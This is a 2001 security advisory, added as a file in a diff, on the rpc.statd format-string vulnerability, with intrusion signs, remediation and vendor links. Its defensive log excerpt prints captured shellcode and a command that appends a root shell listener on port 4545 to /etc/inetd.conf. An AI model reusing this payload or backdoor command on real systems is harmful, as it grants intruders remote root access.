@@ -1,0 +1,106 @@
+=======================
+Organizational Advisory
+=======================
+
+Last revised: February 18, 2001
+Source:	HoneyCERT
+
+Overview
+--------
+A recent compromise of a university computer has alerted HoneyCERT to a vulnerability
+in the rpc.statd service that is installed by default on several Linux distributions.
+System administrators should check affected machines for possible vulnerability to 
+this exploit and take measures outlined below to decrease the risk of system 
+compromise through this service.
+
+CERT/CC has already posted an advisory describing the vulnerability and can be found at:
+
+		http://www.cert.org/advisories/CA-2000-17.html
+
+Description
+-----------
+The rpc.statd program passes user-supplied data to the syslog() function as a format 
+string. If there is no input validation of this string, a malicious user can inject 
+machine code to be executed with the privileges of the rpc.statd process, typically root.
+
+   Signs of Intrusion
+	The intruder removed most signs of the compromise very quickly but the following
+	entries remained from the exploit.  Killing inetd is part of the attack signature.
+
+	Nov XX 00:08:41 victim inetd[408]: pid 2077: exit status 1
+        Nov XX 00:08:41 victim inetd[408]: pid 2078: exit status 1 
+
+
+	While the intruder attempted to remove telltale log entries, the following was
+        found in a deleted system log.
+
+	Nov XX 00:09:00 victim rpc.statd[270]: SM_MON request for hostname
+        containing '/': ^D^D^E^E^F
+        ^F^G^G08049f10
+        bffff754 000028f8 4d5f4d53 72204e4f 65757165 66207473 6820726f 6e74736f
+        20656d61 746e6f63 696e6961 2720676e 203a272f
+        00000000000000000000000000000000000000000000000000000000000000000000000000000000
+        00000000000000000000000000000000000000000000000000000000000000000000000000000000
+        00000000000000000000000000000000000000000000000000000000000000000000000000bffff7
+        0400000000000000000000000000000000000000000000000bffff7050000bffff70600000000000
+        00000000000000000000000000000000000000000000000000000000000000000000000000000000
+        00000000000000000000000000000000000000000000000000000000000000000000000000000000
+        0000000000000bffff707<90><90><90><90><90><90><90><90><90><90><90><90><90><90><90
+        ><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90
+        ><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90>K^<89>v
+
+        <83> <8D>^(<83> <89>^<83> <8D>^.<83> <83> <83>#<89>^
+        1<83>
+        <88>F'<88>F*<83> <88>F<89>F+,
+        <89><8D>N<8D>V<80>1<89>@<80>/bin
+        /sh -c echo 4545 stream tcp 
+        nowait root /bin/sh sh -i >> /etc/inetd.conf;killall -HUP inetd
+
+	Additional IDS sensors on the network also detected the shellcode transferred
+        during the compromise.
+
+	Nov X 23:11:51 witness snort[1260]: IDS362 - MISC - Shellcode X86 NOPS-UDP: 
+                                            aaa.aaa.aa.a:710 -> vvv.vv.v.vvv:871
+
+	The compromised system also had a hidden directory under the man documentation
+	tree /usr/man/.Ci that contained a set of exploit tools, trojaned binaries, and
+        a sniffer.  The presence of this directory indicates that your machine may have
+	been compromised in a similar manner.
+
+	Any matching log entries found on your systems should be investigated and reported
+        to the proper response team.
+
+Impact
+------
+	By causing a buffer overrun in the rpc.statd program, a local or remote attacker
+        may execute arbitrary code with the increased priviliges of the statd service, 
+        which is usually root.
+
+Solution
+--------
+	Upgrade rpc.statd 
+ 		Update to  nfs-utils-0.1.9.1 or later
+
+		x86:
+		ftp://ftp.redhat.com/pub/redhat/redhat-7.0/i386/RedHat/RPMS/nfs-utils-0.1.9.1-7.i386.rpm
+	
+		Source:
+                ftp://ftp.redhat.com/pub/redhat/redhat-7.0/i386/RedHat/RPMS/nfs-utils-0.1.9.1-7.src.rpm
+
+	Disable rpc.statd service
+		This service is unnecessary if NFS functionality is not needed.
+	
+	Block unneeded ports at the firewall
+		Portmapper at port 111 and rpc.statd port which varies
+
+Affected Systems
+----------------
+Only Linux systems are known to be vulnerable to this problem.
+	Debian:
+		http://www.debian.org/security/2000/20000719a 
+
+	Mandrake:
+		http://www.linux-mandrake.com/en/updates/2000/MDKSA-2000-021.php3
+
+	Redhat:
+		http://www.redhat.com/support/errata/RHSA-2000-043-03.html 
